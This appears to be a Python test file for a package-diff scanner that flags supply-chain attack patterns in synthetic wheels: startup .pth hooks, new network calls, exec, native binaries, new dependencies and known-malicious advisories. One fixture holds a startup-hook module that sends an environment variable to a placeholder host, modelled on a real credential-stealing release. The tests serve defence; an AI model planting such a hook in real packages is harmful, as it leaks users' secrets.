"""Tests for algobank/diff.py on synthetic wheels that reproduce real attack patterns.
Run: python3.14 -I v0.1/test_diff.py

The wheels are built in a temporary directory and only parsed; nothing is installed or run.
"""
import os, sys, tempfile, zipfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from algobank import diff as ad

BASE = {
    "demo/__init__.py": "from .util import fmt\n",
    "demo/util.py": "def fmt(s):\n    return s.upper()\n",
}
META = "Metadata-Version: 2.1\nName: demo\nVersion: {v}\nRequires-Dist: idna (>=2)\n"

def wheel(tmp, version, files, meta=None):
    path = os.path.join(tmp, f"demo-{version}-py3-none-any.whl")
    with zipfile.ZipFile(path, "w") as z:
        for name, data in files.items():
            z.writestr(name, data)
        z.writestr(f"demo-{version}.dist-info/METADATA", meta or META.format(v=version))
    return path

def run_diff(old_files, new_files, new_meta=None):
    with tempfile.TemporaryDirectory() as tmp:
        a = ad.analyze(ad.load(wheel(tmp, "1.0", old_files)))
        b = ad.analyze(ad.load(wheel(tmp, "1.1", new_files, new_meta)))
        return ad.diff_report(a, b)

def high(r): return [x for x in r["findings"] if x["severity"] == "high"]
def kinds(r, sev=("high", "medium")): return {x["kind"] for x in r["findings"] if x["severity"] in sev}

def test_clean_update_is_quiet():
    new = dict(BASE, **{"demo/util.py": "def fmt(s):\n    return s.upper() + '!'\n"})
    r = run_diff(BASE, new)
    assert r["nodes"]["code_changed"] == 1
    assert not kinds(r), r["findings"]

def test_startup_hook():
    """LiteLLM 1.107.0: a .pth file and a module that read credentials and send them out."""
    new = dict(BASE, **{
        "demo_init.pth": "import demo._boot\n",
        "demo/_boot.py": "import os, urllib.request\n\n"
                         "def send():\n    urllib.request.urlopen('https://example.invalid', data=os.environ.get('HOME', '').encode())\n",
    })
    r = run_diff(BASE, new)
    texts = " ".join(x["text"] for x in high(r))
    assert "demo_init.pth" in texts and "every Python start" in texts
    assert "network" in texts and "env" in texts

def test_existing_function_gains_network():
    """chalk/debug: an existing formatting function starts using the network."""
    new = dict(BASE, **{"demo/util.py": "import urllib.request\n\ndef fmt(s):\n"
                                        "    urllib.request.urlopen('https://example.invalid')\n    return s.upper()\n"})
    r = run_diff(BASE, new)
    x = next(x for x in high(r) if "network" in x["text"])
    assert "demo.util:fmt" in x["nodes"]

def test_new_dynamic_exec():
    new = dict(BASE, **{"demo/util.py": "def fmt(s):\n    exec(s)\n    return s.upper()\n"})
    r = run_diff(BASE, new)
    assert any("eval, exec" in x["text"] for x in high(r))

def test_new_native_binary():
    new = dict(BASE, **{"demo/_speedups.so": b"\x7fELF not really"})
    r = run_diff(BASE, new)
    assert any(x["kind"] == "native" and x["text"] == "new native binary detected. not checked" for x in high(r))
    assert "native" in r["scope"]["new"] and "native" not in r["scope"]["old"]

def test_native_binary_can_be_ignored():
    """A package with native code can still be algobanked: the binary stays reported, marked ignored,
    to be checked separately, and does not fail the run."""
    with tempfile.TemporaryDirectory() as tmp:
        path = wheel(tmp, "1.0", dict(BASE, **{"demo/_speedups.so": b"\x7fELF not really"}))
        r = ad.scope_report(ad.analyze(ad.load(path)))
        assert any(x["text"] == "native binary detected. not checked" for x in high(r)) and "native" in r["scope"]
        assert ad.main(["scope", path]) == 1
        assert ad.main(["scope", path, "--ignore-native"]) == 0
        hooked = wheel(tmp, "1.1", dict(BASE, **{"demo/_speedups.so": b"\x7fELF", "x.pth": "import demo\n"}))
        assert ad.main(["scope", hooked, "--ignore-native"]) == 1      # only native findings are ignored

def test_new_dependency():
    """axios 1.14.1 added one dependency, plain-crypto-js, which carried the malware."""
    meta = META.format(v="1.1") + "Requires-Dist: plain-crypto-js\n"
    r = run_diff(BASE, BASE, meta)
    assert any("new dependency plain_crypto_js" in x["text"] and "TOP" in x["text"] for x in high(r))

def test_new_optional_dependency_is_high():
    """Test-only and optional dependencies bring unanalyzed code too: setuptools in a test extra
    reaches the environment and files if anything uses it in production."""
    meta = META.format(v="1.1") + "Requires-Dist: setuptools ; extra == 'testing'\n"
    r = run_diff(BASE, BASE, meta)
    assert any("new dependency setuptools" in x["text"] for x in high(r))

def test_dependency_formatting_is_not_a_change():
    meta = "Metadata-Version: 2.1\nName: demo\nVersion: 1.1\nRequires-Dist: idna >=2\n"
    r = run_diff(BASE, BASE, meta)
    assert not r["findings"], r["findings"]

def test_exit_status():
    with tempfile.TemporaryDirectory() as tmp:
        old = wheel(tmp, "1.0", BASE)
        hooked = wheel(tmp, "1.1", dict(BASE, **{"x.pth": "import demo\n"}))
        assert ad.main(["diff", old, old]) == 0
        assert ad.main(["diff", old, hooked]) == 1
        assert ad.main(["diff", old, os.path.join(tmp, "missing.whl")]) == 2
        assert ad.main(["scope", old]) == 0

def test_sdist_is_high():
    """Installing an sdist runs its build backend, and pip download runs it to read the metadata."""
    import io, tarfile
    with tempfile.TemporaryDirectory() as tmp:
        path = os.path.join(tmp, "demo-1.1.tar.gz")
        with tarfile.open(path, "w:gz") as t:
            for name, data in dict(BASE, **{"PKG-INFO": META.format(v="1.1")}).items():
                info = tarfile.TarInfo("demo-1.1/" + name); info.size = len(data.encode())
                t.addfile(info, io.BytesIO(data.encode()))
        r = ad.scope_report(ad.analyze(ad.load(path)))
        assert any(x["kind"] == "sdist" and "TOP" in x["text"] for x in high(r))
        assert ad.main(["scope", path]) == 1

def test_no_network_no_writes():
    """Algobank's own scope: it only reads the files it is given."""
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    files = {}
    for f in ("__init__.py", "__main__.py", "diff.py", "pkgmerkle.py"):
        with open(os.path.join(root, "algobank", f)) as fh:
            files["algobank/" + f] = fh.read()
    scope = set(ad.Package(files).scope())
    assert scope <= {"file"}, scope

def test_called_packages_should_be_algobanked():
    """A called package that was not algobanked in the same run is a warning, never a failure."""
    with tempfile.TemporaryDirectory() as tmp:
        demo = wheel(tmp, "1.0", BASE)                                   # calls idna
        idna = os.path.join(tmp, "idna-3.7-py3-none-any.whl")
        with zipfile.ZipFile(idna, "w") as z:
            z.writestr("idna/__init__.py", "def encode(s):\n    return s\n")
            z.writestr("idna-3.7.dist-info/METADATA", "Metadata-Version: 2.1\nName: idna\nVersion: 3.7\n")
        alone = ad.with_called(ad.scope_report(ad.analyze(ad.load(demo))), ad.analyze(ad.load(demo)), {"demo"})
        w = [x for x in alone["findings"] if x["severity"] == "warning"]
        assert len(w) == 1 and w[0]["kind"] == "not algobanked" and "idna" in w[0]["text"]
        try:
            with_data(tmp)                                               # no advisories: only this check is tested
            assert ad.main(["scope", demo]) == 0                         # soft: the exit status is unchanged
            both = ad.with_called(ad.scope_report(ad.analyze(ad.load(demo))), ad.analyze(ad.load(demo)), {"demo", "idna"})
            assert not [x for x in both["findings"] if x["severity"] == "warning"]
            assert ad.main(["scope", demo, idna]) == 0
        finally: reset()
        r = run_diff(BASE, BASE, META.format(v="1.1") + "Requires-Dist: plain-crypto-js\n")
        assert any(x["severity"] == "high" and x["kind"] == "dependency" for x in r["findings"])   # new dependency stays high

# ---- known data: tested with a synthetic known.json, never the shipped one

import hashlib, json

def advisory(id, name, versions=(), ranges=(), files=()):
    """A record in the OSV format the advisories are published in."""
    e = dict(id=id, affected=[dict(package=dict(name=name, ecosystem="PyPI"), versions=list(versions),
                                   ranges=[dict(type="ECOSYSTEM", events=ev) for ev in ranges])])
    if files:
        e["database_specific"] = dict(iocs=dict(files=[dict(digests=dict(sha256=d), paths=["x"]) for d in files]))
    return e

def with_data(tmp, *advisories):
    path = os.path.join(tmp, "known.json")
    with open(path, "w") as fh:
        json.dump(dict(date="2026-10-27", sources=["test"], advisories=list(advisories)), fh)
    ad.DATA, ad._known = path, None

def reset():
    ad.DATA = os.path.join(os.path.dirname(ad.__file__), "known.json"); ad._known = None

def known(tmp, version, *advisories, files=BASE):
    with_data(tmp, *advisories)
    a = ad.analyze(ad.load(wheel(tmp, version, files)))
    return [x for x in ad.with_known(ad.scope_report(a), a)["findings"] if x["kind"].startswith("known")]

def test_known_release_by_version_list():
    with tempfile.TemporaryDirectory() as tmp:
        try:
            r = known(tmp, "1.1", advisory("PYSEC-0", "demo", versions=["1.1"]))
            assert len(r) == 1 and r[0]["severity"] == "high" and r[0]["kind"] == "known vulnerability"
            assert "PYSEC-0" in r[0]["text"] and "algobank/known.json" in r[0]["text"]
            assert not known(tmp, "1.2", advisory("PYSEC-0", "demo", versions=["1.1"]))
        finally: reset()

def test_known_release_by_range():
    """Ranges are evaluated here, with PEP 440 ordering: a secure version must pass every time."""
    with tempfile.TemporaryDirectory() as tmp:
        try:
            rng = [[{"introduced": "1.2"}, {"fixed": "1.10"}]]
            for v, hit in [("1.1", False), ("1.2", True), ("1.9", True), ("1.10rc1", True), ("1.10", False), ("1.10.post1", False)]:
                assert bool(known(tmp, v, advisory("PYSEC-1", "demo", ranges=rng))) == hit, v
            every = [[{"introduced": "0"}]]                             # most malicious-package reports
            r = known(tmp, "9.9", advisory("MAL-1", "demo", ranges=every))
            assert r and r[0]["kind"] == "known malicious"
            assert known(tmp, "2.0", advisory("MAL-2", "demo"))         # no versions, no ranges: every version
            assert not known(tmp, "1.3", advisory("PYSEC-2", "demo", ranges=[[{"introduced": "1.0"}, {"last_affected": "1.2"}]]))
        finally: reset()

def test_known_release_uncomparable_version():
    """When a version cannot be compared with a range, the advisory may apply, so it is reported."""
    with tempfile.TemporaryDirectory() as tmp:
        try:
            r = known(tmp, "1.0", advisory("PYSEC-3", "demo", ranges=[[{"introduced": "0"}, {"fixed": "not-a-version"}]]))
            assert r and "may apply" in r[0]["text"]
        finally: reset()

def test_known_malicious_file_inside_archive():
    """litellm 1.107.0: the .pth file's digest is published, so a repackaged copy is caught too."""
    pth = "import cook\n"
    with tempfile.TemporaryDirectory() as tmp:
        try:
            r = known(tmp, "9.9", advisory("MAL-3", "litellm", files=[hashlib.sha256(pth.encode()).hexdigest()]),
                      files=dict(BASE, **{"cook.pth": pth}))
            assert any(x["kind"] == "known malicious" and "cook.pth" in x["text"] for x in r)
        finally: reset()

def test_known_data_date_is_stated():
    with tempfile.TemporaryDirectory() as tmp:
        try:
            with_data(tmp)
            a = ad.analyze(ad.load(wheel(tmp, "1.0", BASE)))
            assert any("as of 2026-10-27" in c for c in ad.with_known(ad.scope_report(a), a)["coverage"])
        finally: reset()

if __name__ == "__main__":
    import contextlib, io
    tests = [v for k, v in sorted(globals().items()) if k.startswith("test_")]
    for t in tests:
        with contextlib.redirect_stdout(io.StringIO()):
            t()
        print("ok  ", t.__name__)
    print(f"{len(tests)} tests passed")
